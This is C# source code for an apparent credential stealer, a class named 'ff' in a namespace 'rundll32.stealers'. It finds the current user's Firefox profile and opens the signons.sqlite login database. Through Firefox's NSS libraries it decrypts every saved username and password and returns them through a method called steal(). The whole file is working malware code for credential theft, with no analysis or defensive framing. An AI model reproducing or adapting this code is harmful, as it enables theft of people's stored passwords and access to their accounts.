using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace rundll32.stealers;

internal class ff
{
	public class SHITEMID
	{
		public static long cb;

		public static byte[] abID;
	}

	public struct TSECItem
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long DLLFunctionDelegate(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long DLLFunctionDelegate2();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

	public struct ffEntry
	{
		public string host;

		public string user;

		public string pass;
	}

	internal class SQLiteBase
	{
		public enum SQLiteDataTypes
		{
			BLOB = 4,
			FLOAT = 2,
			INT = 1,
			NULL = 5,
			TEXT = 3
		}

		private const int SQL_DONE = 101;

		private const int SQL_OK = 0;

		private const int SQL_ROW = 100;

		private IntPtr database;

		public SQLiteBase()
		{
			database = IntPtr.Zero;
		}

		public SQLiteBase(string baseName)
		{
			OpenDatabase(baseName);
		}

		public void CloseDatabase()
		{
			if (database != IntPtr.Zero)
			{
				sqlite3_close(database);
			}
		}

		public void ExecuteNonQuery(string query)
		{
			sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, out var error);
			if (error != IntPtr.Zero)
			{
				throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + PointerToString(sqlite3_errmsg(error)));
			}
		}

		public DataTable ExecuteQuery(string query)
		{
			sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), out var statement, out var _);
			DataTable table = new DataTable();
			for (int num = ReadFirstRow(statement, ref table); num == 100; num = ReadNextRow(statement, ref table))
			{
			}
			sqlite3_finalize(statement);
			return table;
		}

		private int GetPointerLenght(IntPtr ptr)
		{
			if (ptr == IntPtr.Zero)
			{
				return 0;
			}
			return lstrlen(ptr);
		}

		[DllImport("kernel32")]
		private static extern IntPtr GetProcessHeap();

		public ArrayList GetTables()
		{
			string query = "SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1";
			DataTable dataTable = ExecuteQuery(query);
			ArrayList arrayList = new ArrayList();
			foreach (DataRow row in dataTable.Rows)
			{
				arrayList.Add(row.ItemArray[0]!.ToString());
			}
			return arrayList;
		}

		[DllImport("kernel32")]
		private static extern IntPtr HeapAlloc(IntPtr heap, uint flags, uint bytes);

		[DllImport("kernel32")]
		private static extern int lstrlen(IntPtr str);

		public void OpenDatabase(string baseName)
		{
			if (sqlite3_open(StringToPointer(baseName), out database) != 0)
			{
				database = IntPtr.Zero;
				throw new Exception("Error with opening database " + baseName + "!");
			}
		}

		private string PointerToString(IntPtr ptr)
		{
			if (ptr == IntPtr.Zero)
			{
				return null;
			}
			Encoding uTF = Encoding.UTF8;
			int pointerLenght = GetPointerLenght(ptr);
			byte[] array = new byte[pointerLenght];
			Marshal.Copy(ptr, array, 0, pointerLenght);
			return uTF.GetString(array, 0, pointerLenght);
		}

		private int ReadFirstRow(IntPtr statement, ref DataTable table)
		{
			table = new DataTable("resultTable");
			if (sqlite3_step(statement) == 100)
			{
				int num = sqlite3_column_count(statement);
				string text = "";
				object[] array = new object[num];
				for (int i = 0; i < num; i++)
				{
					text = PointerToString(sqlite3_column_name(statement, i));
					switch (sqlite3_column_type(statement, i))
					{
					default:
						table.Columns.Add(text, Type.GetType("System.String"));
						array[i] = "";
						break;
					case 1:
						table.Columns.Add(text, Type.GetType("System.Int32"));
						array[i] = sqlite3_column_int(statement, i);
						break;
					case 2:
						table.Columns.Add(text, Type.GetType("System.Single"));
						array[i] = sqlite3_column_double(statement, i);
						break;
					case 3:
						table.Columns.Add(text, Type.GetType("System.String"));
						array[i] = PointerToString(sqlite3_column_text(statement, i));
						break;
					case 4:
						table.Columns.Add(text, Type.GetType("System.String"));
						array[i] = PointerToString(sqlite3_column_blob(statement, i));
						break;
					}
				}
				table.Rows.Add(array);
			}
			return sqlite3_step(statement);
		}

		private int ReadNextRow(IntPtr statement, ref DataTable table)
		{
			int num = sqlite3_column_count(statement);
			object[] array = new object[num];
			for (int i = 0; i < num; i++)
			{
				switch (sqlite3_column_type(statement, i))
				{
				default:
					array[i] = "";
					break;
				case 1:
					array[i] = sqlite3_column_int(statement, i);
					break;
				case 2:
					array[i] = sqlite3_column_double(statement, i);
					break;
				case 3:
					array[i] = PointerToString(sqlite3_column_text(statement, i));
					break;
				case 4:
					array[i] = PointerToString(sqlite3_column_blob(statement, i));
					break;
				}
			}
			table.Rows.Add(array);
			return sqlite3_step(statement);
		}

		[DllImport("sqlite3")]
		private static extern int sqlite3_close(IntPtr database);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_count(IntPtr statement);

		[DllImport("sqlite3")]
		private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_table_name(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_errmsg(IntPtr database);

		[DllImport("sqlite3")]
		private static extern int sqlite3_exec(IntPtr database, IntPtr query, IntPtr callback, IntPtr arguments, out IntPtr error);

		[DllImport("sqlite3")]
		private static extern int sqlite3_finalize(IntPtr handle);

		[DllImport("sqlite3")]
		private static extern int sqlite3_open(IntPtr fileName, out IntPtr database);

		[DllImport("sqlite3")]
		private static extern int sqlite3_prepare_v2(IntPtr database, IntPtr query, int length, out IntPtr statement, out IntPtr tail);

		[DllImport("sqlite3")]
		private static extern int sqlite3_step(IntPtr statement);

		private IntPtr StringToPointer(string str)
		{
			if (str == null)
			{
				return IntPtr.Zero;
			}
			byte[] bytes = Encoding.UTF8.GetBytes(str);
			int bytes2 = bytes.Length + 1;
			IntPtr intPtr = HeapAlloc(GetProcessHeap(), 0u, (uint)bytes2);
			Marshal.Copy(bytes, 0, intPtr, bytes.Length);
			Marshal.WriteByte(intPtr, bytes.Length, 0);
			return intPtr;
		}
	}

	private static IntPtr NSS3;

	public static string signon;

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	private static long NSS_Init(string configdir)
	{
		string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		LoadLibrary(text + "mozcrt19.dll");
		LoadLibrary(text + "nspr4.dll");
		LoadLibrary(text + "plc4.dll");
		LoadLibrary(text + "plds4.dll");
		LoadLibrary(text + "ssutil3.dll");
		LoadLibrary(text + "sqlite3.dll");
		LoadLibrary(text + "nssutil3.dll");
		LoadLibrary(text + "softokn3.dll");
		NSS3 = LoadLibrary(text + "nss3.dll");
		IntPtr procAddress = GetProcAddress(NSS3, "NSS_Init");
		DLLFunctionDelegate dLLFunctionDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate));
		return dLLFunctionDelegate(configdir);
	}

	private static long PK11_GetInternalKeySlot()
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
		DLLFunctionDelegate2 dLLFunctionDelegate = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate2));
		return dLLFunctionDelegate();
	}

	private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_Authenticate");
		DLLFunctionDelegate3 dLLFunctionDelegate = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate3));
		return dLLFunctionDelegate(slot, loadCerts, wincx);
	}

	private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
		DLLFunctionDelegate4 dLLFunctionDelegate = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate4));
		return dLLFunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
	}

	private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11SDR_Decrypt");
		DLLFunctionDelegate5 dLLFunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
		return dLLFunctionDelegate(ref data, ref result, cx);
	}

	public static ffEntry[] steal()
	{
		bool flag = false;
		List<ffEntry> list = new List<ffEntry>();
		long num = 0L;
		_ = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
		string[] directories = Directory.GetDirectories(path);
		string[] array = directories;
		foreach (string text in array)
		{
			if (flag)
			{
				break;
			}
			string[] files = Directory.GetFiles(text);
			string[] array2 = files;
			foreach (string input in array2)
			{
				if (flag)
				{
					break;
				}
				if (Regex.IsMatch(input, "signons.sqlite"))
				{
					NSS_Init(text);
					signon = input;
				}
			}
		}
		string baseName = signon;
		TSECItem result = default(TSECItem);
		TSECItem result2 = default(TSECItem);
		SQLiteBase sQLiteBase = new SQLiteBase(baseName);
		DataTable dataTable = sQLiteBase.ExecuteQuery("SELECT * FROM moz_logins;");
		num = PK11_GetInternalKeySlot();
		PK11_Authenticate(num, loadCerts: true, 0L);
		foreach (DataRow row in dataTable.Rows)
		{
			string host = Convert.ToString(row["formSubmitURL"].ToString());
			string user = "";
			string pass = "";
			StringBuilder stringBuilder = new StringBuilder(row["encryptedUsername"].ToString());
			int value = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
			TSECItem data = (TSECItem)Marshal.PtrToStructure(new IntPtr(value), typeof(TSECItem));
			if (PK11SDR_Decrypt(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
			{
				byte[] array3 = new byte[result.SECItemLen];
				Marshal.Copy(new IntPtr(result.SECItemData), array3, 0, result.SECItemLen);
				user = Encoding.ASCII.GetString(array3);
			}
			StringBuilder stringBuilder2 = new StringBuilder(row["encryptedPassword"].ToString());
			int value2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
			TSECItem data2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(value2), typeof(TSECItem));
			if (PK11SDR_Decrypt(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
			{
				byte[] array3 = new byte[result2.SECItemLen];
				Marshal.Copy(new IntPtr(result2.SECItemData), array3, 0, result2.SECItemLen);
				pass = Encoding.ASCII.GetString(array3);
			}
			ffEntry item = default(ffEntry);
			item.host = host;
			item.user = user;
			item.pass = pass;
			list.Add(item);
		}
		return list.ToArray();
	}
}
